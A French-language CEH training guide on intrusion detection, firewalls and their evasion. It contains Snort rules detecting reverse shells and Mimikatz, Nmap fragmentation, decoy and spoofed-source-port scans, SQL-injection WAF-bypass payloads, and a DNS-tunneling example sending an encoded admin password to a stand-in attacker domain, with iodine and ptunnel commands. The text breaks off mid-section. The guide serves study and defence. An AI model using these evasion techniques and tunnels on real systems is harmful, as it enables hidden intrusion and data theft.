# 🛡️ CEH v12 — MODULE 12 : ÉVASION IDS/PARE-FEU/HONEYPOTS
### Guide pédagogique avancé — Défense et détection | ML | exploit4040

---

## 📌 INTRODUCTION — POURQUOI CE MODULE EST STRATÉGIQUE

Le Module 12 représente une **convergence critique** dans le parcours CEH. Après avoir appris à attaquer (Modules 3-11), tu dois maintenant comprendre les **systèmes de défense** et comment les attaquants tentent de les contourner — pour mieux les configurer.

```
PHILOSOPHIE PROFESSIONNELLE :

"Pour configurer un IDS qui détecte vraiment,
 tu dois comprendre comment on l'évite."

"Pour placer un honeypot efficace,
 tu dois savoir comment les attaquants les détectent."

"Pour écrire des règles de firewall solides,
 tu dois connaître les techniques de bypass."

→ Ce module = perspective du défenseur
  armé de la connaissance de l'attaquant
```

```
ÉCOSYSTÈME DE DÉFENSE RÉSEAU :

Internet
    │
    ▼
┌─────────────────────────────────────────────────┐
│  PÉRIMÈTRE EXTERNE                              │
│  ├── Firewall périmétrique                      │
│  ├── IPS réseau (inline)                        │
│  └── WAF (si applications web)                  │
└─────────────────┬───────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────┐
│  DMZ (Zone démilitarisée)                       │
│  ├── Serveurs web                               │
│  ├── Serveurs mail                              │
│  └── Honeypots stratégiquement placés           │
└─────────────────┬───────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────┐
│  RÉSEAU INTERNE                                 │
│  ├── Firewall interne                           │
│  ├── IDS réseau (NIDS)                          │
│  ├── IDS hôte (HIDS) sur chaque serveur         │
│  └── SIEM centralisant tout                     │
└─────────────────────────────────────────────────┘
```

---

## 📌 PARTIE 1 : IDS/IPS — SYSTÈMES DE DÉTECTION D'INTRUSION

### 🔵 IDS vs IPS — La distinction fondamentale

```
IDS (Intrusion Detection System) :
═══════════════════════════════════════════════════════════════

Mode    : PASSIF
Rôle    : DÉTECTER et ALERTER
Position: En dehors du flux de trafic (copie miroir)
Action  : Génère des alertes → analyste décide

Flux réseau ──────────────────────────────> Destination
                    │
                    ▼ (copie du trafic)
                   IDS
                    │
                    ▼
                 ALERTE → SIEM → Analyste

Avantage  : Pas d'impact sur les performances
Inconvénient : Réaction humaine requise → délai

═══════════════════════════════════════════════════════════════

IPS (Intrusion Prevention System) :
═══════════════════════════════════════════════════════════════

Mode    : ACTIF (inline)
Rôle    : DÉTECTER et BLOQUER
Position: Dans le flux de trafic (en ligne)
Action  : Bloque automatiquement le trafic suspect

Flux réseau ──> IPS ──> Destination
                │
                ▼ (si suspect)
              BLOQUER + ALERTER

Avantage  : Réaction immédiate, pas d'humain requis
Inconvénient : Faux positifs = trafic légitime bloqué !
               Latence ajoutée
               Si IPS tombe → réseau coupé (fail-open/close)
```

---

### 🔵 Types d'IDS par emplacement

```
NIDS (Network-based IDS) :
═══════════════════════════════════════════════════════════════
├── Surveille le trafic réseau global
├── Placé sur des segments stratégiques (SPAN port, TAP)
├── Voit tous les paquets qui passent
├── Exemples : Snort, Suricata, Zeek/Bro, Cisco Firepower
└── Limite : trafic chiffré (TLS) = invisible

HIDS (Host-based IDS) :
═══════════════════════════════════════════════════════════════
├── Installé sur chaque machine à surveiller
├── Surveille : fichiers système, logs, processus,
│              registre, appels système
├── Voit le trafic DÉCHIFFRÉ (après TLS)
├── Exemples : OSSEC, Wazuh, Tripwire, AIDE, Sysmon
└── Limite : coût de déploiement à grande échelle

WIRELESS IDS (WIDS) :
═══════════════════════════════════════════════════════════════
├── Surveille les réseaux WiFi
├── Détecte : Rogue AP, deauth attacks, evil twin
└── Exemples : Cisco Adaptive Wireless IPS, Kismet
```

---

### 🔵 Méthodes de détection IDS

```
MÉTHODE 1 : DÉTECTION PAR SIGNATURE (Misuse Detection)
═══════════════════════════════════════════════════════════════

PRINCIPE :
Base de données de signatures = patterns d'attaques connues
→ Comparer chaque paquet aux signatures
→ Correspondance = ALERTE

EXEMPLE DE SIGNATURE SNORT :
alert tcp any any -> $HOME_NET 80
  (msg:"SQL Injection detected";
   content:"UNION SELECT";
   nocase;
   sid:1000001;)

→ Si "UNION SELECT" détecté dans trafic HTTP → Alerte SQL Injection

AVANTAGES :
├── Faible taux de faux positifs
├── Rapide à exécuter
└── Facile à comprendre et maintenir

INCONVÉNIENTS :
├── Ne détecte PAS les attaques inconnues (zero-days)
├── Facilement contournable (obfuscation)
└── Nécessite mises à jour constantes

═══════════════════════════════════════════════════════════════

MÉTHODE 2 : DÉTECTION PAR ANOMALIE (Anomaly Detection)
═══════════════════════════════════════════════════════════════

PRINCIPE :
Établir une BASELINE du comportement normal
→ Détecter les DÉVIATIONS par rapport à la baseline

EXEMPLES DE BASELINE :
├── Volume de trafic moyen : 100 Mbps ± 20 Mbps
├── Connexions/heure : 500 ± 100
├── Ports habituellement utilisés : 80, 443, 22
└── Horaires d'utilisation : 8h-18h

DÉVIATIONS = ALERTES :
├── Pic de trafic soudain à 3h du matin → DDoS ?
├── Connexions vers 50 ports différents → Scan ?
├── Transfert massif de données vers IP externe → Exfiltration ?
└── Connexion depuis un pays inhabituel → Compromission ?

AVANTAGES :
├── Peut détecter des attaques inconnues (zero-days)
├── Détecte les comportements anormaux
└── S'adapte à l'environnement

INCONVÉNIENTS :
├── Taux de faux positifs plus élevé
├── Période d'apprentissage longue (baseline)
└── Difficile à configurer correctement

═══════════════════════════════════════════════════════════════

MÉTHODE 3 : DÉTECTION HEURISTIQUE
═══════════════════════════════════════════════════════════════

PRINCIPE :
Règles basées sur l'expérience et la logique
pour détecter des comportements suspects

EXEMPLES :
├── "Si une machine envoie des SYN vers 100 IPs différentes
│    en 10 secondes → probable worm"
├── "Si un processus crée un enfant cmd.exe depuis Word
│    → probable macro malveillante"
└── "Si trafic DNS avec entrées de 200+ caractères
    → probable DNS tunneling"
```

---

## 📌 PARTIE 2 : SNORT — MAÎTRISE COMPLÈTE

**Snort** est l'IDS/IPS open source le plus utilisé au monde. Maintenu par **Cisco Talos**.

### 🛠️ Architecture Snort

```
ARCHITECTURE SNORT 3 :
═══════════════════════════════════════════════════════════════

Trafic réseau
      │
      ▼
┌─────────────────────────────────────────────────┐
│  PACKET ACQUISITION (DAQ)                       │
│  → Capture les paquets (libpcap, DPDK, AF_XDP)  │
└─────────────────┬───────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────┐
│  PACKET DECODER                                 │
│  → Décode Ethernet, IP, TCP, UDP, ICMP...       │
└─────────────────┬───────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────┐
│  PREPROCESSORS                                  │
│  → Défragmentation IP                           │
│  → Réassemblage TCP streams                     │
│  → Décodage HTTP, SMB, FTP...                   │
└─────────────────┬───────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────┐
│  DETECTION ENGINE                               │
│  → Comparaison aux règles (signatures)          │
│  → Pattern matching                             │
└─────────────────┬───────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────┐
│  OUTPUT PLUGINS                                 │
│  → Logs, alertes, SIEM, base de données         │
└─────────────────────────────────────────────────┘
```

---

### 🛠️ Installation et configuration Snort

```bash
# Installation sur Ubuntu/Kali
sudo apt install snort

# Vérifier la version
snort --version
```

**Sortie :**
```
   ,,_     -*> Snort! <*-
  o"  )~   Version 3.1.74.0
   ''''    By Martin Roesch & The Snort Team
           https://www.snort.org/contact#team
           Copyright (C) 2014-2023 Cisco and/or its affiliates.
           Copyright (C) 1998-2013 Sourcefire, Inc., et al.
```

```bash
# Modes de fonctionnement

# Mode sniffer (affiche les paquets)
sudo snort -v -i eth0

# Mode packet logger
sudo snort -dev -l /var/log/snort -i eth0

# Mode IDS (avec règles)
sudo snort -A console -q -i eth0 \
           -c /etc/snort/snort.conf

# Mode IPS (inline avec iptables)
sudo snort -Q --daq afpacket \
           -i eth0:eth1 \
           -c /etc/snort/snort.conf
```

---

### 🛠️ Anatomie complète d'une règle Snort

```
STRUCTURE D'UNE RÈGLE SNORT :
═══════════════════════════════════════════════════════════════

ACTION  PROTO  SRC_IP  SRC_PORT  DIRECTION  DST_IP  DST_PORT  (OPTIONS)

alert   tcp    any     any       ->         $HOME_NET  80      (msg:"Test"; sid:1;)

═══════════════════════════════════════════════════════════════

ACTIONS :
┌────────────────────────────────────────────────────────────┐
│  ACTION   │  COMPORTEMENT                                  │
├────────────────────────────────────────────────────────────┤
│  alert    │  Génère une alerte + log                       │
│  log      │  Log uniquement (pas d'alerte)                 │
│  pass     │  Ignorer le paquet                             │
│  drop     │  Bloquer + alerter (mode IPS)                  │
│  reject   │  Bloquer + envoyer RST/ICMP unreachable        │
│  sdrop    │  Bloquer silencieusement (pas de log)          │
└────────────────────────────────────────────────────────────┘

PROTOCOLES : tcp, udp, icmp, ip

DIRECTION :
├── ->  : source vers destination
├── <-  : destination vers source
└── <>  : bidirectionnel

OPTIONS PRINCIPALES :
```

```
OPTIONS DE CONTENU (Pattern Matching) :
═══════════════════════════════════════════════════════════════

content:"pattern"          → Chercher ce texte
content:"|48 65 6C 6C 6F|" → Chercher en hexadécimal
nocase                     → Insensible à la casse
offset:5                   → Commencer la recherche à l'octet 5
depth:20                   → Chercher dans les 20 premiers octets
within:10                  → Pattern dans les 10 octets suivants
distance:5                 → Décalage depuis pattern précédent
rawbytes                   → Chercher dans les données brutes
http_uri                   → Dans l'URI HTTP
http_header                → Dans les headers HTTP
http_client_body           → Dans le body HTTP POST
http_method                → Dans la méthode HTTP
pcre:"/regex/"             → Expression régulière

OPTIONS DE FLUX :
═══════════════════════════════════════════════════════════════

flow:to_server             → Trafic vers le serveur
flow:to_client             → Trafic vers le client
flow:established           → Connexion établie (post-handshake)
flow:stateless             → Sans suivi d'état

OPTIONS DE THRESHOLD (Seuils) :
═══════════════════════════════════════════════════════════════

threshold:type limit, track by_src, count 5, seconds 60
→ Alerter max 5 fois par IP source par minute

threshold:type threshold, track by_dst, count 100, seconds 10
→ Alerter quand 100 paquets vers même destination en 10s

threshold:type both, track by_src, count 10, seconds 30
→ Alerter quand 10 occurrences, puis 1 alerte/30s
```

---

### 🛠️ Règles Snort pratiques avec sorties

#### Règle 1 — Détecter un scan Nmap SYN

```bash
# Règle dans /etc/snort/rules/local.rules
cat >> /etc/snort/rules/local.rules << 'EOF'
alert tcp any any -> $HOME_NET any
  (msg:"SCAN Nmap SYN Scan Detected";
   flags:S,12;
   threshold:type threshold, track by_src,
             count 20, seconds 5;
   classtype:network-scan;
   priority:2;
   sid:9000001;
   rev:1;)
EOF
```

**Sortie Snort lors d'un scan Nmap :**
```
[**] [1:9000001:1] SCAN Nmap SYN Scan Detected [**]
[Classification: Detection of a Network Scan] [Priority: 2]
11/15-19:30:12.123456 192.168.1.5:47821 -> 192.168.1.10:22
TCP TTL:56 TOS:0x0 ID:12345 IpLen:20 DgmLen:44
******S* Seq: 0x1A2B3C4D  Ack: 0x0

[**] [1:9000001:1] SCAN Nmap SYN Scan Detected [**]
11/15-19:30:12.234567 192.168.1.5:47821 -> 192.168.1.10:23
[**] [1:9000001:1] SCAN Nmap SYN Scan Detected [**]
11/15-19:30:12.345678 192.168.1.5:47821 -> 192.168.1.10:80
[... alerte pour chaque port...]
```

---

#### Règle 2 — Détecter injection SQL

```bash
alert tcp any any -> $HOME_NET 80
  (msg:"SQL Injection - UNION SELECT";
   flow:to_server,established;
   content:"UNION";
   nocase;
   content:"SELECT";
   nocase;
   within:20;
   http_uri;
   classtype:web-application-attack;
   priority:1;
   sid:9000002;
   rev:1;)
```

**Sortie :**
```
[**] [1:9000002:1] SQL Injection - UNION SELECT [**]
[Classification: Web Application Attack] [Priority: 1]
11/15-19:35:22.456789 192.168.1.5:52341 -> 192.168.1.10:80
TCP TTL:64 TOS:0x0 ID:54321 IpLen:20 DgmLen:512
...
URI: /dvwa/vulnerabilities/sqli/?id=1'
     UNION SELECT user(),database()--+

→ ALERTE : Tentative d'injection SQL détectée !
```

---

#### Règle 3 — Détecter un reverse shell

```bash
alert tcp $HOME_NET any -> any any
  (msg:"MALWARE Possible Reverse Shell Outbound";
   flow:to_server,established;
   content:"/bin/sh";
   nocase;
   classtype:trojan-activity;
   priority:1;
   sid:9000003;
   rev:1;)

alert tcp $HOME_NET any -> any 4444
  (msg:"MALWARE Metasploit Default Port 4444";
   flow:to_server,established;
   classtype:trojan-activity;
   priority:1;
   sid:9000004;
   rev:1;)
```

---

#### Règle 4 — Détecter DNS Tunneling

```bash
alert udp $HOME_NET any -> any 53
  (msg:"DNS Tunneling - Long DNS Query";
   content:"|00 00 10 00 01|";
   byte_test:1,>,50,0,relative;
   threshold:type threshold, track by_src,
             count 100, seconds 60;
   classtype:policy-violation;
   priority:2;
   sid:9000005;
   rev:1;)
```

---

#### Règle 5 — Détecter exécution de Mimikatz

```bash
alert tcp any any -> $HOME_NET any
  (msg:"CREDENTIAL DUMP Mimikatz Keywords";
   flow:established;
   content:"sekurlsa";
   nocase;
   classtype:credential-theft;
   priority:1;
   sid:9000006;
   rev:1;)

alert tcp any any -> $HOME_NET any
  (msg:"CREDENTIAL DUMP lsass Access";
   flow:established;
   content:"lsass.exe";
   nocase;
   content:"minidump";
   nocase;
   within:50;
   classtype:credential-theft;
   priority:1;
   sid:9000007;
   rev:1;)
```

---

### 🛠️ Lecture et analyse des logs Snort

```bash
# Lire les alertes en temps réel
sudo tail -f /var/log/snort/alert

# Lire les fichiers PCAP capturés par Snort
tcpdump -r /var/log/snort/snort.log.1700000000

# Analyser avec u2spewfoo (format unified2)
u2spewfoo /var/log/snort/merged.log
```

**Sortie complète d'une alerte Snort :**
```
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

[**] [1:9000002:1] SQL Injection - UNION SELECT [**]
[Classification: Web Application Attack] [Priority: 1]
11/15-19:35:22.456789  [**] [Impact: HIGH]

Source IP   : 192.168.1.5
Source Port : 52341
Dest IP     : 192.168.1.10
Dest Port   : 80
Protocol    : TCP

Packet details:
GET /dvwa/vulnerabilities/sqli/
    ?id=1'UNION+SELECT+user(),database()--+
    &Submit=Submit HTTP/1.1
Host: 192.168.1.10
User-Agent: sqlmap/1.7.8
Cookie: PHPSESSID=abc123; security=low

[Rule]
Rule: alert tcp any any -> $HOME_NET 80
(msg:"SQL Injection - UNION SELECT"; ...)
File: /etc/snort/rules/local.rules
Line: 15

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
```

---

## 📌 PARTIE 3 : SURICATA — L'IDS/IPS MODERNE

**Suricata** est l'IDS/IPS open source nouvelle génération, successeur moderne de Snort.

```
DIFFÉRENCES SNORT vs SURICATA :
═══════════════════════════════════════════════════════════════

┌────────────────────────────────────────────────────────────┐
│  CRITÈRE          │  SNORT 3          │  SURICATA          │
├────────────────────────────────────────────────────────────┤
│  Threading        │  Single-thread    │  Multi-thread ✅   │
│  Performance      │  Bonne            │  Excellente ✅     │
│  Protocoles       │  Standard         │  Plus nombreux ✅  │
│  TLS inspection   │  Limité           │  Natif ✅          │
│  Lua scripting    │  Non              │  Oui ✅            │
│  Output JSON      │  Via plugin       │  Natif (EVE) ✅    │
│  File extraction  │  Limité           │  Natif ✅          │
│  Compatibilité    │  Règles Snort     │  Règles Snort ✅   │
│  Réputation IP    │  Non              │  Oui ✅            │
└────────────────────────────────────────────────────────────┘
```

```bash
# Installation Suricata
sudo apt install suricata

# Mise à jour des règles (Emerging Threats)
sudo suricata-update

# Lancer Suricata en mode IDS
sudo suricata -c /etc/suricata/suricata.yaml \
              -i eth0 \
              --pidfile /run/suricata.pid
```

---

### 🛠️ Sortie EVE JSON de Suricata

```bash
# Observer les alertes en temps réel
sudo tail -f /var/log/suricata/eve.json | python3 -m json.tool
```

**Sortie JSON complète :**
```json
{
  "timestamp": "2024-11-15T19:35:22.456789+0200",
  "flow_id": 1234567890,
  "in_iface": "eth0",
  "event_type": "alert",
  "src_ip": "192.168.1.5",
  "src_port": 52341,
  "dest_ip": "192.168.1.10",
  "dest_port": 80,
  "proto": "TCP",
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 2019284,
    "rev": 4,
    "signature": "ET WEB_SERVER SQL Injection - UNION SELECT",
    "category": "Web Application Attack",
    "severity": 1
  },
  "http": {
    "hostname": "192.168.1.10",
    "url": "/dvwa/vulnerabilities/sqli/?id=1'UNION+SELECT+user()--",
    "http_user_agent": "sqlmap/1.7.8",
    "http_method": "GET",
    "protocol": "HTTP/1.1",
    "status": 200,
    "length": 4521
  },
  "payload": "R0VUIC9kdmE...",
  "payload_printable": "GET /dvwa/vulnerabilities...",
  "stream": 1,
  "packet": "RQAA...",
  "metadata": {
    "flowints": {
      "http.anomaly.count": 1
    }
  }
}
```

---

## 📌 PARTIE 4 : ZEEK (BRO) — ANALYSE RÉSEAU COMPORTEMENTALE

**Zeek** (anciennement Bro) n'est pas un IDS au sens classique mais un **framework d'analyse réseau** qui génère des logs structurés.

```bash
# Lancer Zeek sur une interface
sudo zeek -i eth0 local.zeek

# Lire un fichier PCAP
sudo zeek -r capture.pcap local.zeek
```

**Logs Zeek générés automatiquement :**
```
conn.log     → Toutes les connexions réseau
dns.log      → Requêtes DNS
http.log     → Trafic HTTP
ssl.log      → Connexions TLS/SSL
files.log    → Fichiers transférés
smtp.log     → Emails SMTP
ftp.log      → Sessions FTP
ssh.log      → Connexions SSH
weird.log    → Anomalies protocolaires
notice.log   → Alertes Zeek
```

**Exemple conn.log :**
```
#separator \x09
#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto duration orig_bytes resp_bytes conn_state

1700000000.0 CXx123 192.168.1.5  52341 192.168.1.10 80   tcp  2.345  1024    4521    SF
1700000001.0 CYy456 192.168.1.5  52342 192.168.1.10 445  tcp  0.001  0       0       REJ
1700000002.0 CZz789 192.168.1.5  52343 8.8.8.8      53   udp  0.012  45      123     SF
```

**Analyse des connexions rejetées (scan) :**
```bash
# Trouver les IPs qui génèrent beaucoup de connexions refusées
cat conn.log | zeek-cut id.orig_h conn_state | \
    grep REJ | sort | uniq -c | sort -rn | head -10
```

**Sortie :**
```
   1234 192.168.1.5 REJ    ← 1234 connexions refusées = SCAN !
     23 10.0.0.45 REJ
      5 172.16.1.22 REJ
```

---

## 📌 PARTIE 5 : HIDS — OSSEC ET WAZUH

### 🛠️ OSSEC/Wazuh — Monitoring des hôtes

```
WAZUH SURVEILLE SUR CHAQUE AGENT :
═══════════════════════════════════════════════════════════════

INTÉGRITÉ DES FICHIERS (FIM) :
├── Surveille les modifications de fichiers critiques
├── Alerte si /etc/passwd, /etc/shadow modifiés
├── Alerte si binaires système changent
└── Compare hash SHA256 avant/après

LOGS SYSTÈME :
├── /var/log/auth.log (connexions, sudo)
├── /var/log/syslog
├── Windows Event Logs
└── Logs applicatifs (Apache, Nginx, MySQL)

DÉTECTION DE ROOTKITS :
├── Scan des fichiers cachés
├── Vérification des ports cachés
└── Processus masqués

ANALYSE DE VULNÉRABILITÉS :
└── Inventaire logiciel vs CVEs connus
```

**Alerte Wazuh typique :**
```json
{
  "timestamp": "2024-11-15T19:40:00.000Z",
  "rule": {
    "level": 12,
    "description": "Multiple authentication failures followed by a success",
    "id": "40101",
    "mitre": {
      "attack": ["T1110"],
      "technique": ["Brute Force"]
    }
  },
  "agent": {
    "id": "001",
    "name": "win-server01",
    "ip": "192.168.1.15"
  },
  "data": {
    "srcip": "192.168.1.5",
    "dstuser": "Administrateur",
    "count": "47 failures then success"
  },
  "full_log": "Multiple failed logins (47) then successful login
               for Administrateur from 192.168.1.5"
}
```

---

## 📌 PARTIE 6 : TYPES DE PARE-FEU

### 🔵 Évolution des pare-feux

```
GÉNÉRATION 1 : PACKET FILTER (Stateless)
═══════════════════════════════════════════════════════════════

Analyse : Chaque paquet individuellement
Critères : IP source/destination, port, protocole

RÈGLE IPTABLES EXEMPLE :
iptables -A INPUT -s 192.168.1.0/24 -p tcp \
         --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP

FAIBLESSE :
→ Ne voit pas le contexte de la connexion
→ Vulnerable aux attaques de fragmentation
→ Ne comprend pas les applications

═══════════════════════════════════════════════════════════════

GÉNÉRATION 2 : STATEFUL INSPECTION
═══════════════════════════════════════════════════════════════

Analyse : Contexte complet de la connexion
→ Maintient une TABLE D'ÉTAT des connexions actives
→ Vérifie que les paquets appartiennent à une connexion légitime

TABLE D'ÉTAT :
┌──────────────────────────────────────────────────────────┐
│  SRC IP    │ SRC PORT │ DST IP     │ DST PORT │ STATE    │
├──────────────────────────────────────────────────────────┤
│ 192.168.1.20│ 52341   │ 8.8.8.8   │ 80       │ ESTAB    │
│ 192.168.1.20│ 52342   │ 1.1.1.1   │ 443      │ ESTAB    │
│ 192.168.1.5 │ 47821   │ 192.168.1.10│ 22     │ SYN_SENT │
└──────────────────────────────────────────────────────────┘

AVANTAGE :
→ Seuls les paquets appartenant à une connexion établie passent
→ Protège contre les ACK scans, les paquets forgés

EXEMPLES :
→ iptables avec --state (Linux)
→ Windows Defender Firewall
→ Cisco ASA

═══════════════════════════════════════════════════════════════

GÉNÉRATION 3 : APPLICATION-LEVEL GATEWAY (Proxy Firewall)
═══════════════════════════════════════════════════════════════

Analyse : Contenu applicatif (Layer 7)
→ Comprend les protocoles HTTP, FTP, DNS...
→ Peut inspecter le contenu des communications

EXEMPLE :
→ Proxy HTTP peut détecter un téléchargement d'exécutable
→ Proxy FTP peut bloquer certaines commandes
→ Deep Packet Inspection (DPI)

INCONVÉNIENT :
→ Très lent (doit traiter tout le contenu)
→ Ne fonctionne pas bien avec TLS (chiffré)

═══════════════════════════════════════════════════════════════

GÉNÉRATION 4 : NEXT-GENERATION FIREWALL (NGFW)
═══════════════════════════════════════════════════════════════

Combine TOUTES les générations précédentes PLUS :
├── Application Awareness (identifier l'app, pas juste le port)
│   → Port 80 peut transporter Skype, YouTube, ou attaques
│   → NGFW identifie la vraie application
│
├── User Identity Awareness
│   → Règles par UTILISATEUR, pas seulement par IP
│   → Intégration Active Directory
│
├── SSL/TLS Inspection
│   → Déchiffrer le TLS, inspecter, rechiffrer
│   → Voir dans le trafic chiffré
│
├── IPS intégré
│
├── URL Filtering
│   → Catégorisation des sites web
│
└── Threat Intelligence
    → Feeds d'IPs malveillantes en temps réel

EXEMPLES NGFW :
├── Palo Alto Networks PA-Series
├── Fortinet FortiGate
├── Cisco Firepower (ASA + IPS)
├── Check Point
└── Sophos XG

═══════════════════════════════════════════════════════════════

WAF (Web Application Firewall)
═══════════════════════════════════════════════════════════════

Spécialisé pour les applications web.
Protège contre : SQLi, XSS, CSRF, RFI, LFI...

MODE DÉTECTION : Alertes uniquement
MODE PRÉVENTION : Bloque les requêtes malveillantes

EXEMPLES :
├── ModSecurity (open source, Apache/Nginx)
├── Cloudflare WAF
├── AWS WAF
└── F5 Advanced WAF
```

---

## 📌 PARTIE 7 : TECHNIQUES D'ÉVASION IDS/FIREWALL

> **Contexte pédagogique :** Ces techniques sont étudiées pour comprendre comment configurer les IDS et firewalls de manière à résister à ces attaques, et pour conduire des tests d'intrusion autorisés.

---

### 🔵 Évasion par Fragmentation

```
PRINCIPE :
Un IDS doit réassembler les fragments pour analyser
le contenu complet. Si l'IDS ne le fait pas ou
le fait mal, on peut cacher des attaques dans
des paquets fragmentés.

COMMENT ÇA FONCTIONNE :
Payload d'attaque : "UNION SELECT"
→ Fragment 1 : "UNI"
→ Fragment 2 : "ON "
→ Fragment 3 : "SEL"
→ Fragment 4 : "ECT"

IDS voit chaque fragment séparément :
"UNI", "ON ", "SEL", "ECT" → Aucun pattern détecté !

La cible réassemble → "UNION SELECT" → Attaque réussie !
```

```bash
# Fragmentation avec Nmap (-f)
sudo nmap -sS -f 192.168.1.10
#         ↑ Fragments de 8 octets

sudo nmap -sS -ff 192.168.1.10
#           ↑ Fragments de 16 octets

sudo nmap -sS --mtu 24 192.168.1.10
#              ↑ MTU personnalisé (multiple de 8)

# Avec hping3
sudo hping3 -S -f -p 80 192.168.1.10
#              ↑ Fragment flag
```

**Sortie Nmap avec fragmentation :**
```
Starting Nmap 7.94 at 2024-11-15 19:45 CAT

[Sending fragmented SYN packets...]
Nmap scan report for 192.168.1.10

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql

→ Scan réussi avec fragmentation
→ IDS sans réassemblage de fragments = aveugle
```

---

### 🔵 Évasion par IP Spoofing et Decoy

```bash
# Decoy scan Nmap
sudo nmap -sS -D 10.0.0.1,10.0.0.2,10.0.0.3,ME 192.168.1.10
```

**Ce que voit l'IDS :**
```
[ALERTE] 10.0.0.1 scanne 192.168.1.10
[ALERTE] 10.0.0.2 scanne 192.168.1.10
[ALERTE] 10.0.0.3 scanne 192.168.1.10
[ALERTE] 192.168.1.5 scanne 192.168.1.10 ← Vraie IP, noyée dans le bruit

→ Analyste reçoit 4 alertes simultanées
→ Impossible de déterminer la vraie source rapidement
→ Gain de temps pour l'attaquant

LOG IDS :
11/15-19:46:00 10.0.0.1 -> 192.168.1.10 SYN port 80
11/15-19:46:00 10.0.0.2 -> 192.168.1.10 SYN port 80
11/15-19:46:00 10.0.0.3 -> 192.168.1.10 SYN port 80
11/15-19:46:00 192.168.1.5 -> 192.168.1.10 SYN port 80
```

---

### 🔵 Évasion par Manipulation du Timing

```bash
# Scan très lent (T0 = Paranoid - 1 paquet toutes les 5 minutes)
sudo nmap -sS -T0 192.168.1.10

# Scan avec délais personnalisés
sudo nmap -sS --scan-delay 30s 192.168.1.10
sudo nmap -sS --max-rate 1 192.168.1.10

# Aléatoire entre les paquets
sudo nmap -sS --randomize-hosts 192.168.1.0/24
```

```
POURQUOI LE TIMING ÉVITE LA DÉTECTION :

RÈGLE IDS BASÉE SUR LE TEMPS :
alert tcp any any -> $HOME_NET any
  (threshold: type threshold, track by_src,
               count 20, seconds 5;   ← 20 paquets en 5 secondes
   msg:"Port Scan Detected";)

ÉVASION :
→ Envoyer 1 paquet toutes les 5 minutes
→ La règle ne se déclenche jamais !
→ Scan de 65535 ports = 65535 × 5 min ≈ 227 jours...
   (compromis entre discrétion et praticité)
```

---

### 🔵 Évasion par Manipulation des Ports Source

```bash
# Utiliser le port 53 (DNS) comme source
# Certains firewalls autorisent tout ce qui vient de/vers 53
sudo nmap -sS --source-port 53 192.168.1.10
sudo hping3 -S -s 53 -p 80 192.168.1.10
```

**Pourquoi ça fonctionne :**
```
RÈGLE FIREWALL NAÏVE :
# Autoriser réponses DNS
iptables -A INPUT -p udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp --sport 53 -j ACCEPT
                   ↑
             Port SOURCE 53
             → Autoriser TOUT ce qui vient du port 53

EXPLOITATION :
→ Attaquant met son port source à 53
→ Le firewall pense que c'est une réponse DNS
→ Laisse passer !
```

---

### 🔵 Évasion par Obfuscation d'URL (WAF Bypass)

```
LE WAF CHERCHE : "UNION SELECT"

TECHNIQUES D'OBFUSCATION :
═══════════════════════════════════════════════════════════════

1. URL ENCODING
   UNION SELECT → %55%4E%49%4F%4E%20%53%45%4C%45%43%54
   
   Test : ?id=1'%20%55%4E%49%4F%4E%20%53%45%4C%45%43%54--

2. DOUBLE URL ENCODING
   %20 → %2520 (% encodé en %25)
   ?id=1'%2520UNION%2520SELECT--

3. CASE VARIATION
   UnIoN SeLeCt
   uNiOn sElEcT

4. COMMENTS INSERTION (MySQL)
   UN/**/ION /**/SELECT
   UNION/*bypass*/SELECT

5. WHITESPACE ALTERNATIVES
   UNION%09SELECT   (%09 = tabulation)
   UNION%0ASELECT   (%0A = newline)
   UNION%0DSELECT   (%0D = carriage return)
   UNION%0D%0ASELECT

6. SCIENTIFIC NOTATION (pour les chiffres)
   ?id=1e0 UNION SELECT   (1e0 = 1)

7. USING FUNCTION EQUIVALENTS
   SLEEP(5) → BENCHMARK(5000000,MD5(1))
   
EXEMPLE COMBINÉ :
?id=1'/**/uNi/**/oN/**/sEl/**/eCt/**/1,2,database()--+
```

---

### 🔵 Évasion par Tunneling

```
DNS TUNNELING :
═══════════════════════════════════════════════════════════════

PRINCIPE :
Encapsuler n'importe quel protocole dans des requêtes DNS.
→ Port 53 UDP/TCP généralement ouvert
→ Pas de filtrage de contenu DNS dans beaucoup de firewalls

DONNÉES ENCODÉES :
données_à_exfiltrer → Base32/64 → Sous-domaine DNS
"mot_de_passe_admin" → "CE5WK3TMFUTQ2YLOMFWWK4Q=" → requête DNS

REQUÊTE DNS TUNNELING :
dig CE5WK3TMFUTQ2YLOMFWWK4Q.attacker-tunnel.com A

→ Le serveur DNS de attacker-tunnel.com = serveur C2
→ Il reçoit les données encodées dans les requêtes
→ Répond avec les commandes à exécuter

OUTILS : iodine, dnscat2, dns2tcp

IODINE EXEMPLE :
# Côté serveur (C2)
iodined -f 10.0.0.1 tunnel.attacker.com

# Côté client (sur la machine compromise)
iodine -f tunnel.attacker.com

→ Crée un tunnel IP sur DNS → toute communication
  passe par le port 53 !

═══════════════════════════════════════════════════════════════

ICMP TUNNELING :
═══════════════════════════════════════════════════════════════

PRINCIPE :
Encapsuler données dans le champ data des paquets ICMP.
Les pings sont souvent autorisés partout.

PTUNNEL : outil de tunneling ICMP
# Côté serveur
ptunnel -x mot_de_passe

# Côté client
ptunnel -p ip_serveur -lp 8000 -da dest -dp 22 -x mdp

→ SSH via ICMP ! Indétectable sans DPI.

═══════════════════════════════════════════════════════════════

HTTP/HTTPS TUNNELING :
═══════════════════════════════════════════════════════════════

PRINCIPE :
Encapsuler le C2 dans du trafic HTTP/HTTPS apparemment légitime.
→ Port 443 HTTPS = toujours ouvert
→ Contenu chiffré = WAF/IDS aveugle

OUTILS : Cobalt Strike (HTTPS beacon), Metasploit HTTPS
Exemple : payload Meterpreter HTTPS
